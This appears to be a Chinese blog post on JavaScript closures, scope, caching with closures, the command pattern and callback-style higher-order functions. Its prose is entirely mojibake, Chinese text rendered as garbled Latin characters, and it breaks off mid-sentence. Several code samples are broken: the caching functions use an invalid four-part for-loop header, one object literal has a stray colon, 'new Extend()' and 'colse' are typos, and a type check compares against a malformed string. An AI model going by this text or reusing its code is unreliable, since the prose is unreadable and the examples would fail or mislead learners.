è¡¨è¾¾å¼ã€é—­åŒ…ã€é«˜é˜¶å‡½æ•°ç­‰ç‰¹æ€§ã€‚ä½¿ç”¨è¿™äº›ç‰¹æ€§ï¼Œå¯ä»¥ç”¨ä¸€æ´—çµæ´»è€Œå·§å¦™çš„æ–¹å¼æ¥ç¼–å†™ JavaScript ä»£ç ã€‚ JavaScript å¾ˆå¤šæ¨¡å¼éƒ½ç”¨åˆ°é—­åŒ…å’Œé«˜é˜¶å‡½æ•°æ¥å®žçŽ°. é—­åŒ…é—­åŒ…çš„å½¢æˆä¸Žå˜é‡çš„ä½œç”¨åŸŸå·²ç»å˜é‡çš„ç”Ÿå­˜å‘¨æœŸå¯†åˆ‡ç›¸å…³ã€‚ å˜é‡çš„ä½œç”¨åŸŸå˜é‡çš„ä½œç”¨åŸŸï¼Œå°±æ˜¯æŒ‡å˜é‡çš„æœ‰æ•ˆèŒƒå›´ï¼Œæˆ‘ä»¬æœ€å¸¸è¯´çš„å°±æ˜¯åœ¨å‡½æ•°å£°æ˜Žçš„å˜é‡ä½œç”¨åŸŸã€‚ å½“åœ¨å‡½æ•°ä¸­å£°æ˜Žä¸€ä¸ªå˜é‡çš„æ—¶å€™ï¼Œå¦‚æžœè¯¥å˜é‡å‰é¢æ²¡æœ‰åŠ ä¸Š var å…³é”®å­—ï¼Œè¿™ä¸ªå˜é‡å°±ä¼šå˜æˆå…¨å±€å˜é‡ã€‚ å¦å¤–ä¸€ç§æƒ…å†µæ˜¯ç”¨ var å…³é”®å­—åœ¨å‡½æ•°å£°æ˜Žå˜é‡ï¼Œè¿™æ—¶å€™çš„å˜é‡å³æ˜¯å±€éƒ¨å˜é‡ï¼Œåªæœ‰åœ¨è¯¥å‡½æ•°å†…éƒ¨æ‰èƒ½è®¿é—®åˆ°è¿™ä¸ªå˜é‡ï¼Œåœ¨å‡½æ•°å¤–é¢æ˜¯è®¿é—®ä¸åˆ°çš„ã€‚ 123456var func = function()&#123; var a = 1; console.log(a); // è¾“å‡ºï¼š1&#125;func(); console.log(a); // Uncaught ReferenceError: a is not defined æœç´¢çš„è¿‡ç¨‹ä¼šéšç€ä»£ç çš„æ‰§è¡ŒçŽ¯èŠ‚åˆ›å»ºçš„ä½œç”¨åŸŸé“¾å¾€å¤–å±‚é€å±‚æœç´¢ï¼Œä¸€ç›´åˆ°å…¨å±€å¯¹è±¡ä¸ºæ­¢ã€‚å˜é‡çš„æœç´¢æ˜¯ä»Žå†…åˆ°å¤–ã€‚ å°è¯•å¾—å‡ºä¸‹é¢ä»£ç çš„ç­”æ¡ˆï¼Œå¯ä»¥åŠ æ·±å¯¹å˜é‡æœç´¢è¿‡ç¨‹çš„ç†è§£ï¼š 123456789101112var a = 1;var func = function()&#123; var b = 2; var func2 = function()&#123; var c = 3; console.log(b); console.log(a); &#125; func2(); console.log(c);&#125;func(); å˜é‡çš„ç”Ÿå­˜å‘¨æœŸé™¤äº†å˜é‡çš„ä½œç”¨åŸŸä¹‹å¤–ï¼Œå¦å¤–ä¸€ä¸ªè·Ÿé—­åŒ…æœ‰å…³çš„æ¦‚å¿µæ˜¯å˜é‡çš„ç”Ÿå­˜å‘¨æœŸã€‚ å¯¹äºŽå…¨å±€å˜é‡æ¥è¯´ï¼Œå…¨å±€å˜é‡çš„ç”Ÿå­˜å‘¨æœŸæ˜¯æ°¸ä¹…çš„ï¼Œé™¤éžæˆ‘ä»¬ä¸»åŠ¨é”€æ¯è¿™ä¸ªå…¨å±€å˜é‡ã€‚è€Œå¯¹äºŽåœ¨å‡½æ•°å†…ç”¨ var å…³é”®å­—å£°æ˜Žçš„å±€éƒ¨å˜é‡æ¥è¯´ï¼Œå½“é€€å‡ºå‡½æ•°æ—¶ï¼Œè¿™äº›å±€éƒ¨å˜é‡å³å¤±åŽ»äº†å®ƒä»¬çš„ä»·å€¼ï¼Œå®ƒä»¬ä¼šéšç€å‡½æ•°è°ƒç”¨çš„ç»“æŸè€Œè¢«é”€æ¯ï¼š 12345678910111213141516171819202122var func = function()&#123; var a = 1; console.log(a); // é€€å‡ºå‡½æ•°åŽï¼Œå±€éƒ¨å˜é‡ a å°†è¢«é”€æ¯&#125;func();// ä¸‹ä¸€ä¸ªä¾‹å­var func = function()&#123; var a = 1; return function()&#123; a++; console.log(a); &#125;&#125;var f = func();f(); // 2f(); // 3f(); // 4f(); // 5/*è·Ÿä¸Šé¢çš„ç»“è®ºç›¸åï¼Œè¿™æ˜¯å› ä¸ºå½“æ‰§è¡Œäº† var f = func() æ—¶å€™ï¼Œf è¿”å›žäº†ä¸€ä¸ªåŒ¿åå‡½æ•°çš„å¼•ç”¨ï¼Œå®ƒå¯ä»¥è®¿é—®åˆ° func è¢«è°ƒç”¨æ—¶äº§ç”Ÿçš„çŽ¯å¢ƒï¼Œè€Œå±€éƒ¨å˜é‡ä¸€ç›´åœ¨è¿™ä¸ªçŽ¯å¢ƒä¸­ã€‚æ—¢ç„¶å±€éƒ¨å˜é‡æ‰€åœ¨çš„çŽ¯å¢ƒè¿˜èƒ½è¢«å¤–ç•Œè®¿é—®ï¼Œè¿™ä¸ªå±€éƒ¨å˜é‡å°±æœ‰äº†ä¸å˜é”€æ¯çš„ç†ç”±ã€‚åœ¨è¿™é‡Œå°±äº§ç”Ÿäº†ä¸€ä¸ªé—­åŒ…ç»“æž„ï¼Œå±€éƒ¨å˜é‡çš„å£°æ˜Žçœ‹èµ·æ¥å»¶ç»­äº†ã€‚*/ é—­åŒ…çš„ç»å…¸æ¡ˆä¾‹ï¼š 1234567891011/*å‡è®¾é¡µé¢ä¸Šæœ‰5ä¸ª div èŠ‚ç‚¹ï¼Œæˆ‘ä»¬é€šè¿‡å¾ªçŽ¯æ¥ç»™æ¯ä¸ª div ç»‘å®š onclick æ—¶é—´ï¼ŒæŒ‰ç…§ç´¢å¼•çš„ é¡ºåºï¼Œç‚¹å‡»ç¬¬ä¸€ä¸ª div æ¼”å‡º0ï¼Œç¬¬äºŒä¸ªå¼¹å‡º1ï¼Œä»¥æ­¤ç±»æŽ¨*/var nodes = document.getElementsByTagName('div');for(var i = 0; i &lt; nodes.length; i++)&#123; (function(i)&#123; nodes[i].onClick = function()&#123; console.log(i); &#125; &#125;)(i);&#125; åŒæ ·çš„é“ç†ï¼Œè¿˜æœ‰ä¸‹é¢çš„ä¾‹å­ï¼š 1234567891011var Type = &#123;&#125;;for(var i = 0; type; type = ['String','Array','Numebr'][i++])&#123; (function(type)&#123; Type["is"+type] = function(obj)&#123; return Object.prototype.toString.call(obj) === "[Object"+type+"]"; &#125; &#125;)(type);&#125;Type.isArray([]); // trueType.isString("str"); // true é—­åŒ…çš„æ›´å¤šä½œç”¨1.å°è£…å˜é‡é—­åŒ…å¯ä»¥å¸®åŠ©æŠŠä¸€äº›ä¸éœ€è¦æš´éœ²åœ¨å…¨å±€çš„å˜é‡å°è£…æˆ â€œç§æœ‰å˜é‡â€ã€‚å‡è®¾æœ‰ä¸€ä¸ªè®¡ç®—ä¹˜ç§¯çš„ç®€å•å‡½æ•°ï¼š 123456789101112131415161718192021222324252627282930313233343536373839var mult = function()&#123; var a = 1; for(var i = 0; l = arguments.length; i &lt; l; i++)&#123; a = a* arguments[i] &#125; return a;&#125;/* mult å‡½æ•°æŽ¥å—ä¸€äº› number ç±»åž‹çš„å‚æ•°ï¼Œå¹¶è¿”å›žè¿™äº›å‚æ•°çš„ä¹˜ç§¯ï¼Œæˆ‘ä»¬è§‰å¾—å¯¹äºŽé‚£äº›ç›¸åŒçš„å‚æ•°æ¥è¯´ï¼Œæ¯æ¬¡è¿›è¡Œè®¡ç®—æ˜¯ä¸€ç§æµªè´¹ï¼Œæˆ‘ä»¬å¯ä»¥åŠ å…¥ç¼“å­˜æœºåˆ¶æ¥æé«˜è¿™ä¸ªå‡½æ•°çš„æ€§èƒ½ï¼š*/var cache = &#123;&#125;;var mult = function()&#123; var args = Array.prototype.join.call(arguments,','); if(cache[args])&#123; return cache[args]; &#125; var a = 1; for(var i = 0; l = arguments.length; i &lt; l; i++)&#123; a = a* arguments[i] &#125; return cache[args] = a;&#125;/*å¯ä»¥çœ‹åˆ° cache è¿™ä¸ªå˜é‡ä»…ä»…åœ¨ mult å‡½æ•°å†…éƒ¨ä½¿ç”¨ï¼Œä¸Žå…¶è®© cache å˜é‡è·Ÿ mult å‡½æ•°ä¸€èµ·å¹³è¡Œåœ°æš´éœ²åœ¨å…¨å±€ä½œç”¨åŸŸä¸‹ï¼Œä¸å¦‚æŠŠå®ƒå°è£…åœ¨ mult å‡½æ•°å†…éƒ¨ã€‚å¯ä»¥å‡å°‘é¡µé¢ä¸­çš„å…¨å±€å˜é‡ï¼Œä»¥é¿å…è¿™ä¸ªå˜é‡åœ¨å…¶ä»–åœ°æ–¹è¢«ä¸å°å¿ƒä¿®æ”¹äº†è€Œå¼•å‘é”™è¯¯ã€‚æ”¹è¿›çš„å¦‚ä¸‹ï¼š*/var mult = (function()&#123; var cache = &#123;&#125;; return function()&#123; var args = Array.prototype.join.call(arguments,','); if(cache[args])&#123; return cache[args]; &#125; var a = 1; for(var i = 0; l = arguments.length; i &lt; l; i++)&#123; a = a* arguments[i] &#125; return cache[args] = a; &#125;&#125;)(); æç‚¼å‡½æ•°æ˜¯ä»£ç é‡æž„çš„ä¸€ä¸ªå¸¸è§çš„æŠ€å·§ï¼Œå¦‚æžœåœ¨ä¸€ä¸ªå¤§å‡½æ•°ä¸­æœ‰ä¸€äº›ä»£ç èƒ½å¤Ÿç‹¬ç«‹å¼€æ¥ï¼Œæˆ‘ä»¬å¸¸å¸¸æŠŠè¿™äº›ä»£ç å°è£…åœ¨ç‹¬ç«‹çš„å°å‡½æ•°é‡Œé¢ã€‚ç‹¬ç«‹å‡ºæ¥çš„å°å‡½æ•°æœ‰åŠ©äºŽä»£ç å¤ç”¨ï¼Œå¦‚æžœè¿™äº›å°å‡½æ•°æœ‰ä¸€ä¸ªè‰¯å¥½çš„å‘½åï¼Œå®ƒä»¬æœ¬èº«ä¹Ÿèµ·åˆ°äº†æ³¨é‡Šçš„ä½œç”¨ã€‚å¦‚æžœè¿™äº›å°å‡½æ•°ä¸è¦åœ¨ç¨‹åºä¸­å…¶ä»–åœ°æ–¹ä½¿ç”¨ï¼Œæœ€å¥½ç”¨é—­åŒ…æŠŠå®ƒä»¬å°è£…èµ·æ¥ï¼Œå¦‚ä¸‹ï¼š 1234567891011121314151617var mult = (function()&#123; var cache = &#123;&#125;; var calculate = function()&#123; // å°é—­ calculate å‡½æ•° var a = 1; for(var i = 0; l = arguments.length; i &lt; l; i++)&#123; a = a* arguments[i] &#125; return a; &#125; return function()&#123; var args = Array.prototype.join.call(arguments,','); if(cache[args])&#123; return cache[args]; &#125; return cache[args] = calculate.apply(null,arguments); &#125;&#125;)(); 2.å»¶ç»­å±€éƒ¨å˜é‡çš„å¯¿å‘½img å¯¹è±¡ç»å¸¸ç”¨äºŽè¿›è¡Œæ•°æ®ä¸ŠæŠ¥ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 12345var report = function(src)&#123; var img = new Image(); img.src = src;&#125;report('http://laibh.top/getUserInfo'); ä½†æ˜¯é€šè¿‡æŸ¥è¯¢åŽå°çš„è®°å½•æˆ‘ä»¬å¾—çŸ¥ï¼Œå› ä¸ºä¸€äº›ä½Žç‰ˆæœ¬æµè§ˆå™¨çš„å®žçŽ°å­˜åœ¨ bugï¼Œåœ¨è¿™äº›æµè§ˆå™¨ä¸‹ä½¿ç”¨ report å‡½æ•°è¿›è¡Œæ•°æ®ä¸ŠæŠ¥ä¼šä¸¢å¤± 30%å·¦å³çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œreport å‡½æ•°å¹¶ä¸æ˜¯æ¯ä¸€æ¬¡éƒ½æˆåŠŸå‘èµ·äº† HTTP è¯·æ±‚ã€‚ ä¸¢å¤±æ•°æ®çš„åŽŸå› æ˜¯ img æ˜¯ report å‡½æ•°ä¸­çš„å±€éƒ¨å˜é‡ï¼Œå½“ report å‡½æ•°çš„è°ƒç”¨ç»“æŸï¼Œimg å±€éƒ¨å˜é‡ä¹Ÿä¼šè¢«é”€æ¯ï¼Œè€Œæ­¤æ—¶æˆ–è€…è¿˜æ²¡æœ‰æ¥å¾—åŠå‘å‡º HTTP è¯·æ±‚ï¼Œæ‰€ä»¥æ­¤æ¬¡è¯·æ±‚å°±ä¼šä¸¢å¤±äº†ã€‚ çŽ°åœ¨æˆ‘ä»¬æŠŠ img å˜é‡ç”¨é—­åŒ…å°é—­èµ·æ¥ï¼Œä¾¿èƒ½è§£å†³è¯·æ±‚ä¸¢å¤±çš„é—®é¢˜ï¼š 12345678var report = (function()&#123; var imgs = []; return function(src)&#123; var img = new Image(); imgs.push(img); img.src = src; &#125;&#125;)(); é—­åŒ…å’Œé¢å‘å¯¹è±¡è®¾è®¡è¿‡ç¨‹ä¸Žæ•°æ®çš„ç»“åˆæ˜¯ å½¢å®¹é¢å‘å¯¹è±¡ä¸­çš„â€œå¯¹è±¡â€ç»å¸¸ä½¿ç”¨çš„è¡¨è¿°ï¼Œå¯¹è±¡ä»¥æ–¹æ³•çš„å½¢å¼åŒ…å«äº†è¿‡ç¨‹ï¼Œè€Œé—­åŒ…åˆ™æ˜¯åœ¨è¿‡ç¨‹ä¸­ä»¥çŽ¯å¢ƒçš„å½¢å¼åŒ…å«äº†æ•°æ®ã€‚é€šå¸¸ç”¨é¢å‘å¯¹è±¡èƒ½å®žçŽ°çš„åŠŸèƒ½ï¼Œç”¨é—­åŒ…ä¹Ÿå¯ä»¥å®žçŽ°ã€‚åä¹‹äº¦ç„¶ï¼Œåœ¨ JavaScriptçš„ç¥–å…ˆè¯­è¨€ Scheme ä¸­ï¼Œç”šè‡³éƒ½æ²¡æœ‰æä¾›é¢å‘å¯¹è±¡çš„åŽŸç”Ÿè®¾è®¡ï¼Œä½†å¯ä»¥ç”¨ é—­åŒ…æ¥å®žçŽ°ä¸€ä¸ªå®Œæ•´çš„é¢å‘å¯¹è±¡ç³»ç»Ÿã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142var extent = function()&#123; var value = 0; return&#123; call: function()&#123; value++: console.log(value); &#125; &#125;&#125;var extent = extent();extent.call(); // 1extent.call(); // 2extent.call(); // 3/*å¯¹è±¡çš„å†™æ³•ï¼š*/var extent = &#123; value:0, call:function()&#123; this.value++; console.log(this.value); &#125;&#125;extent.call(); // 1extent.call(); // 2extent.call(); // 3/*æˆ–è€…ï¼š*/var Extent = function()&#123; this.value = 0;&#125;Extent.prototype.call = function()&#123; this.value ++; console.log(this.value);&#125;var extent = new Extend();extent.call(); // 1extent.call(); // 2extent.call(); // 3 ç”¨é—­åŒ…å®žçŽ°å‘½ä»¤æ¨¡å¼åœ¨å®Œæˆé—­åŒ…å®žçŽ°çš„å‘½ä»¤æ¨¡å¼ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆç”¨é¢å‘å¯¹è±¡çš„æ–¹å¼æ¥ç¼–å†™ä¸€æ®µå‘½ä»¤æ¨¡å¼çš„ä»£ç  123456&lt;html&gt; &lt;body&gt; &lt;button id="execute"&gt;ç‚¹å‡»æˆ‘æ‰§è¡Œå‘½ä»¤&lt;/button&gt; &lt;button id="undo"&gt;ç‚¹å‡»æˆ‘æ‰§è¡Œå‘½ä»¤&lt;/button&gt; &lt;/body&gt;&lt;/html&gt; 12345678910111213141516171819202122232425262728var Tv = &#123; open:function()&#123; console.log("æ‰“å¼€ç”µè§†æœº") &#125;, close:function()&#123; console.log("å…³é—­ç”µè§†æœº") &#125;, &#125;var OpenTvCommand = function(receiver)&#123; this.receiver = receiver;&#125;OpenTvCommand.prototype.execute = function()&#123; this.receiver.open(); // æ‰§è¡Œå‘½ä»¤ï¼Œæ‰“å¼€ç”µè§†æœº&#125;OpenTvCommand.prototype.undo = function()&#123; this.receiver.colse(); // æ‰§è¡Œå‘½ä»¤ï¼Œå…³é—­ç”µè§†æœº&#125;var setCommand = function(command)&#123; document.getElementById('execute').onclick = function()&#123; command.execute(); // æ‰“å¼€ç”µè§†æœº &#125; document.getElementById('undo').onclick = function()&#123; command.undo(); // å…³é—­ç”µè§†æœº &#125; &#125;setCommand(new OpenTvCommand(Tv)); å‘½ä»¤æ¨¡å¼çš„æ„å›¾æ˜¯æŠŠè¯·æ±‚å°è£…ä¸ºå¯¹è±¡ï¼Œä»Žè€Œåˆ†ç¦»è¯·æ±‚çš„å‘èµ·è€…å’Œè¯·æ±‚çš„æŽ¥å—è€…ï¼ˆæ‰§è¡Œè€…ï¼‰ä¹‹é—´çš„è€¦åˆå…³ç³»ï¼Œåœ¨å‘½ä»¤è¢«æ‰§è¡Œä¹‹å‰ï¼Œå¯ä»¥é¢„å…ˆå¾€å‘½ä»¤å¯¹è±¡ä¸­æ¤å…¥å‘½ä»¤çš„æŽ¥å—è€…ã€‚ ä½†åœ¨ JavaScript ä¸­ï¼Œå‡½æ•°ä½œä¸ºä¸€ç­‰å¯¹è±¡ï¼Œæœ¬èº«å°±å¯ä»¥å››å¤„ä¼ é€’ï¼Œç”¨å‡½æ•°å¯¹è±¡è€Œä¸æ˜¯æ™®é€šå¯¹è±¡æ¥å°è£…è¯·æ±‚æ˜¾å¾—æ›´åŠ ç®€å•å’Œè‡ªç„¶ã€‚å¦‚æžœéœ€è¦å¾€å‡½æ•°å¯¹è±¡ä¸­é¢„å…ˆæ¤å…¥å‘½ä»¤çš„æŽ¥å—è€…ï¼Œé‚£ä¹ˆé—­åŒ…å¯ä»¥å®Œæˆè¿™ä¸ªå·¥ä½œã€‚åœ¨é¢å‘å¯¹è±¡ç‰ˆæœ¬çš„å‘½ä»¤æ¨¡å¼ä¸­ï¼Œé¢„å…ˆæ¤å…¥çš„å‘½ä»¤æŽ¥å—è€…è¢«å½“æˆå¯¹è±¡çš„å±žæ€§ä¿å­˜èµ·æ¥ï¼Œè€Œåœ¨é—­åŒ…ç‰ˆæœ¬çš„å‘½ä»¤æ¨¡å¼ä¸­ï¼Œå‘½ä»¤æŽ¥å—è€…ä¼šè¢«å°é—­åœ¨é—­åŒ…å½¢æˆçš„çŽ¯å¢ƒä¸­ï¼Œä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829var Tv = &#123; open:function()&#123; console.log("æ‰“å¼€ç”µè§†æœº") &#125;, close:function()&#123; console.log("å…³é—­ç”µè§†æœº") &#125; &#125;var createCommand = function(receiver)&#123; var execute = function()&#123; return receiver.open(); &#125; var undo = function()&#123; return receiver.close(); &#125; return &#123; execute,undo &#125;&#125;var setCommand = function(command)&#123; document.getElementById('execute').onclick = function()&#123; command.execute(); // æ‰“å¼€ç”µè§†æœº &#125; document.getElementById('undo').onclick = function()&#123; command.undo(); // å…³é—­ç”µè§†æœº &#125; &#125;setCommand(createCommand(Tv)); é—­åŒ…ä¸Žå†…å­˜ç®¡ç†é—­åŒ…æ˜¯ä¸€ä¸ªéžå¸¸å¼ºå¤§çš„ç‰¹æ€§ï¼Œä½†æ˜¯äººä»¬å¯¹è¿™ä¸ªä¹Ÿæœ‰è¯¸å¤šè¯¯è§£ï¼Œä¸€ç§è€¸äººå¬é—»çš„è¯´æ³•æ˜¯é—­åŒ…ä¼šé€ æˆå†…å­˜æ³„éœ²ï¼Œæ‰€ä»¥è¦å°½é‡å‡å°‘é—­åŒ…çš„ä½¿ç”¨ã€‚ å±€éƒ¨å˜é‡æœ¬æ¥åº”è¯¥åœ¨å‡½æ•°é€€å‡ºçš„æ—¶å€™è¢«è§£é™¤å¼•ç”¨ï¼Œä½†å¦‚æžœå±€éƒ¨å˜é‡è¢«å°é—­åœ¨é—­åŒ…å½¢æˆçš„çŽ¯å¢ƒä¸­ï¼Œé‚£ä¹ˆè¿™ä¸ªå±€éƒ¨å˜é‡å°±èƒ½ä¸€ç›´ç”Ÿå­˜ä¸‹åŽ»ã€‚ä»Žè¿™ä¸ªæ„ä¹‰ä¸Šæ¥çœ‹ï¼Œé—­åŒ…çš„ç¡®ä¼šä½¿å¾—ä¸€äº›æ•°æ®æ— æ³•è¢«åŠæ—¶é”€æ¯ã€‚ä½¿ç”¨é—­åŒ…çš„ä¸€éƒ¨åˆ†åŽŸå› æ˜¯æˆ‘ä»¬é€‰æ‹©ä¸»åŠ¨æŠŠä¸€äº›å˜é‡å°é—­åœ¨é—­åŒ…ä¸­ï¼Œå› ä¸ºå¯èƒ½åœ¨ä»¥åŽè¿˜éœ€è¦ä½¿ç”¨è¿™äº›å˜é‡ï¼ŒæŠŠè¿™äº›å˜é‡æ”¾åœ¨é—­åŒ…ä¸­å’Œå…¨å±€ä½œç”¨åŸŸï¼Œå¯¹å†…å­˜æ–¹æ³•çš„å½±å“æ˜¯ä¸€è‡´çš„ï¼Œè¿™é‡Œä¸èƒ½è¯´æˆå†…å­˜æ³„éœ²ï¼Œå¦‚æžœåœ¨å°†æ¥éœ€è¦å›žæ”¶è¿™äº›å˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨æŠŠè¿™äº›å˜é‡è®¾ç½®ä¸º nullã€‚ è·Ÿé—­åŒ…å’Œå†…å­˜æ³„éœ²æœ‰å…³ç³»çš„æ˜¯ï¼Œä½¿ç”¨é—­åŒ…çš„åŒæ—¶æ¯”è¾ƒå®¹æ˜“å½¢æˆå¾ªçŽ¯å¼•ç”¨ï¼Œå¦‚æžœé—­åŒ…çš„ä½œç”¨åŸŸé“¾ä¸­ä¿å­˜ç€ä¸€äº› DOM èŠ‚ç‚¹ï¼Œè¿™æ—¶å€™å°±å¯èƒ½é€ æˆå†…å­˜æ³„éœ²ã€‚ä½†è¿™å¹¶éžé—­åŒ…çš„é—®é¢˜ï¼Œä¹Ÿå¹¶éž JavaScript çš„é—®é¢˜ï¼Œåœ¨ IE æµè§ˆå™¨ä¸­ï¼Œç”±äºŽ BOM å’Œ DOM ä¸­çš„å¯¹è±¡æ˜¯ä½¿ç”¨ C++ ä»¥ COM å¯¹è±¡çš„æ–¹å¼å®žçŽ°çš„ï¼Œè€Œ COM å¯¹è±¡çš„åžƒåœ¾æ”¶é›†æœºåˆ¶é‡‡ç”¨çš„æ˜¯å¼•ç”¨è®¡æ•°ç­–ç•¥ã€‚åœ¨åŸºäºŽå¼•ç”¨è®¡æ•°ç­–ç•¥çš„åžƒåœ¾å›žæ”¶æœºåˆ¶ä¸­ï¼Œå¦‚æžœä¸¤ä¸ªå¯¹è±¡ä¹‹é—´å½¢æˆäº†å¾ªçŽ¯å¼•ç”¨ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªå¯¹è±¡éƒ½æ— æ³•è¢«å›žæ”¶ï¼Œä½†å¾ªçŽ¯å¼•ç”¨é€ æˆçš„å†…å­˜æ³„éœ²åœ¨æœ¬è´¨ä¸Šä¹Ÿä¸æ˜¯é—­åŒ…é€ æˆçš„ã€‚ åŒæ ·ï¼Œå¦‚æžœè¦è§£å†³å¾ªçŽ¯å¼•ç”¨å¸¦æ¥çš„å†…å­˜æ³„éœ²çš„é—®é¢˜ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠå¾ªçŽ¯å¼•ç”¨ä¸­çš„å˜é‡è®¾ä¸º nullï¼Œå°†å˜é‡è®¾ä¸º null ä»¥ä¸ºç€åˆ‡æ–­å˜é‡ä¸Žå®ƒæ­¤å‰çš„å¼•ç”¨çš„å€¼è¿žæŽ¥ã€‚å½“åžƒåœ¾æ”¶é›†å™¨ä¸‹æ¬¡è¿è¡Œæ—¶ï¼Œå°†ä¼šåˆ é™¤è¿™äº›å€¼å¹¶å›žæ”¶å®ƒä»¬å ç”¨çš„å†…å­˜ã€‚ é«˜é˜¶å‡½æ•°é«˜é˜¶å‡½æ•°æ˜¯æŒ‡è‡³å°‘æ»¡è¶³ä¸‹åˆ—æ¡ä»¶ä¹‹ä¸€çš„å‡½æ•° å‡½æ•°å¯ä»¥ä½œä¸ºå‚æ•°è¢«ä¼ é€’ å‡½æ•°å¯ä»¥ä½œä¸ºè¿”å›žå€¼è¾“å‡º JavaScript è¯­è¨€ä¸­çš„å‡½æ•°æ˜¾ç„¶æ»¡è¶³é«˜é˜¶å‡½æ•°çš„æ¡ä»¶ï¼Œåœ¨å®žé™…å¼€å‘ä¸­ï¼Œæ— è®ºæ˜¯å°†å‡½æ•°å½“åšå‚æ•°ä¼ é€’ï¼Œè¿˜æ˜¯è®©å‡½æ•°çš„æ‰§è¡Œç»“æžœè¿”å›žä¸€ä¸ªå‡½æ•°ï¼Œè¿™ä¸¤ç§åœºæ™¯éƒ½æœ‰å¾ˆå¤šåº”ç”¨åœºæ™¯ã€‚ å‡½æ•°ä½œä¸ºå‚æ•°ä¼ é€’æŠŠå‡½æ•°ä½œä¸ºå‚æ•°ä¼ é€’ï¼Œè¿™ä»£ç æˆ‘ä»¬å¯ä»¥æŠ½ç¦»å‡ºä¸€éƒ¨åˆ†å®¹æ˜“å˜åŒ–çš„ä¸šåŠ¡é€»è¾‘ï¼ŒæŠŠè¿™éƒ¨åˆ†ä¸šåŠ¡é€»è¾‘æ”¾åœ¨å‡½æ•°å½¢å‚ä¸­ï¼Œè¿™æ ·ä¸€æ¥å°±å¯ä»¥åˆ†ç¦»ä¸šåŠ¡ä¸­ä»£ç å˜åŒ–ä¸Žä¸å˜çš„éƒ¨åˆ†ï¼Œå…¶ä¸­ä¸€ä¸ªé‡è¦çš„åœºæ™¯å°±æ˜¯åœ¨å¸¸è§çš„å›žè°ƒå‡½æ•°ä¸­ã€‚ 1.å›žè°ƒå‡½æ•°åœ¨ ajax å¼‚æ­¥è¯·æ±‚çš„åº”ç”¨ä¸­ï¼Œå›žè°ƒå‡½æ•°çš„ä½¿ç”¨éžå¸¸é¢‘ç¹ï¼Œå½“æˆ‘ä»¬æƒ³åœ¨ ajax è¯·æ±‚è¿”å›žä¹‹åŽåšä¸€äº›äº‹æƒ…ï¼Œä½†åˆå¹¶ä¸çŸ¥é“è¯·æ±‚è¿”å›žçš„ç¡®åˆ‡æ—¶é—´æ—¶ï¼Œæœ€å¸¸è§çš„æ–¹æ¡ˆå°±æ˜¯æŠŠ callback å‡½æ•°å½“åšå‚æ•°ä¼ å…¥å‘èµ· ajaxè¯·æ±‚çš„æ–¹æ³•ä¸­ï¼Œå¾…è¯·æ±‚å®Œæˆä¹‹åŽæ‰§è¡Œ callback å‡½æ•°ï¼š 12345678910var getUserInfo = function(userId,callback)&#123; $.ajax("http://laibh.top/getUserInfo?"+userId,function(data)&#123; if(typeof callback === 'function')&#123; callback(data); &#125; &#125;);&#125;getUserInfo(12464,function(data)&#123; console.log(data.userName);&#125;); å›žè°ƒå‡½æ•°çš„åº”ç”¨ä¸ä»…åªåœ¨å¼‚æ­¥è¯·æ±‚ä¸­ï¼Œå½“ä¸€ä¸ªå‡½æ•°ä¸é€‚åˆæ‰§è¡Œä¸€äº›è¯·æ±‚æ—¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æŠŠè¿™äº›è¯·æ±‚å°è£…æˆä¸€ä¸ªå‡½æ•°ï¼Œå¹¶æŠŠå®ƒä½œä¸ºå‚æ•°ä¼ é€’ç»™å¦ä¸€ä¸ªå‡½æ•°ï¼Œâ€œå§”æ‰˜â€ç»™å¦å¤–ä¸€ä¸ªå‡½æ•°æ¥æ‰§è¡Œã€‚ æ¯”å¦‚ï¼Œæˆ‘ä»¬æƒ³åœ¨é¡µé¢ä¸­åˆ›å»º100 ä¸ª div èŠ‚ç‚¹ï¼Œç„¶åŽæŠŠè¿™äº›èŠ‚ç‚¹éƒ½è®¾ç½®ä¸ºéšè—ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªæ–¹æ³•ï¼š 1234567891011121314151617181920212223242526272829var appendDiv = function()&#123; for(var i = 0; i&lt; 100; i++)&#123; var div = document.createElement('div'); div.innerHTML = i; document.body.appendChild(div); div.style.display = 'none'; &#125;&#125;appendDiv();/*æŠŠ div.style.display = 'none' çš„é€»è¾‘ç¡¬ç¼–ç åœ¨ appendDiv ä¸­æ˜¾ç„¶æ˜¯ä¸åˆç†çš„ï¼ŒappendDiv æœªå…æœ‰ç‚¹ä¸ªæ€§åŒ–ï¼Œç§°ä¸ºäº†ä¸€ä¸ªéš¾ä»¥å¤ç”¨çš„å‡½æ•°ï¼Œå¹¶ä¸æ˜¯æ¯ä¸ªäººåˆ›å»ºäº†èŠ‚ç‚¹ä¹‹åŽå°±å¸Œæœ›å®ƒä»¬ç«‹å³è¢«éšè—ï¼ŒäºŽæ˜¯æˆ‘ä»¬è¿™è¿™æ®µä»£ç æŠ½å‡ºæ¥ï¼Œç”¨å›žè°ƒå‡½æ•°çš„å½¢å¼ä¼ å…¥ appendDiv ä¸­*/var appendDiv = function(callback)&#123; for(var i = 0; i&lt; 100; i++)&#123; var div = document.createElement('div'); div.innerHTML = i; document.body.appendChild(div); if(typeof callback === 'function')&#123; callback(div); &#125; &#125;&#125;appendDiv(function(node)&#123; node.style.display = 'none';&#125;);/*å¯ä»¥çœ‹åˆ°éšè—èŠ‚ç‚¹çš„è¯·æ±‚å®žé™…ä¸Šæ˜¯ç”±å®¢æˆ·å‘èµ·çš„ï¼Œä½†æ˜¯å®¢æˆ·å¹¶ä¸çŸ¥é“èŠ‚ç‚¹ä»€ä¹ˆæ—¶å€™ä¼šåˆ›å»ºå¥½ï¼ŒäºŽæ˜¯æŠŠéšè—èŠ‚ç‚¹çš„é€»è¾‘æ”¾åœ¨å›žè°ƒå‡½æ•°ä¸­ï¼Œâ€å§”æ‰˜â€œç»™ appendDiv æ–¹æ³•ï¼ŒappenDiv 